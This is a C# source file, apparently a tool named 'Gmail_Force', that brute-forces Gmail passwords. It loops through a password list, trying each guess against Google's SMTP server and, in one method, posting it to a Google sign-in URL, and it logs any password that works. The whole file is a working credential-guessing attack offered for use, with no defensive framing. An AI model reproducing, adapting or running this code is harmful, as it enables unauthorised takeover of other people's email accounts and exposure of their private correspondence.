using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
using System.Net;
using System.Net.Http;
using System.IO;

namespace Gmail_Force
{
    class gmail
    {
        private static readonly HttpClient client = new HttpClient();

        private static string SendRequest(string URL, string Content)
        {
            string Response = string.Empty;

            try
            {
                string dadosPOST = Content;

                var dados = Encoding.UTF8.GetBytes(dadosPOST);

                var requisicaoWeb = WebRequest.CreateHttp(URL);

                requisicaoWeb.Method = "POST";
                requisicaoWeb.ContentType = "application/x-www-form-urlencoded";
                requisicaoWeb.ContentLength = dados.Length;
                requisicaoWeb.UserAgent = " Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0";

                using (var stream = requisicaoWeb.GetRequestStream())
                {
                    stream.Write(dados, 0, dados.Length);
                    stream.Close();
                }

                using (var resposta = requisicaoWeb.GetResponse())
                {
                    var streamDados = resposta.GetResponseStream();
                    StreamReader reader = new StreamReader(streamDados);
                    object objResponse = reader.ReadToEnd();

                    Response = objResponse.ToString();

                    streamDados.Close();
                    resposta.Close();
                }
            }
            catch (Exception ex)
            {
                Response = "Network::SendRequest# " + ex.Message;
            }

            return Response;
        }
        private static bool smtp(string target, string pass)
        {
            try
            {
                var client = new SmtpClient("smtp.gmail.com", 587)
                {
                    Credentials = new NetworkCredential(target, pass),
                    EnableSsl = true,
                };

                client.Send(target, target, "1", "1");

                return true;
            }
            catch(Exception ex)
            {
                return false;
            }
        }
        public static void LoginSMTP(string target)
        {
            try
            {
                int i = 1;

                foreach (string pass in IO.Passwords)
                {
                    Log.Write("[*] Trying password " + i.ToString() + " of " + IO.Passwords.Count(), Log.LogType.Error);

                    if(smtp(target, pass))
                    {
                        Log.Write("[!] Found password: " + pass, Log.LogType.Success);
                        break;
                    }

                    i++;
                }
                Log.Write("[!] Bruteforce finished!", Log.LogType.Success);
            }
            catch(Exception ex)
            {
                Log.Write(ex.Message, Log.LogType.Error);
            }
        }
        public static void LoginHTTP(string target)
        {
            try
            {
                string url = "https://accounts.google.com/signin/v2/challenge/password/empty";
    
                int i = 1;

                foreach (string pass in IO.Passwords)
                {
                    Log.Write("[*] Trying password " + i.ToString() + " of " + IO.Passwords.Count(), Log.LogType.Error);
                    string content = "identifier=" + target + "&identifierInput=" + target + "&continue=https://mail.google.com/mail/&password=" + pass + "ca=&ct=";
                    Console.WriteLine(SendRequest(url, content));

                    if (smtp(target, pass))
                    {
                        Log.Write("[!] Found password: " + pass, Log.LogType.Success);
                        break;
                    }

                    i++;
                }
                Log.Write("[!] Bruteforce finished!", Log.LogType.Success);
            }
            catch (Exception ex)
            {
                Log.Write(ex.Message, Log.LogType.Error);
            }
        }
    }
}
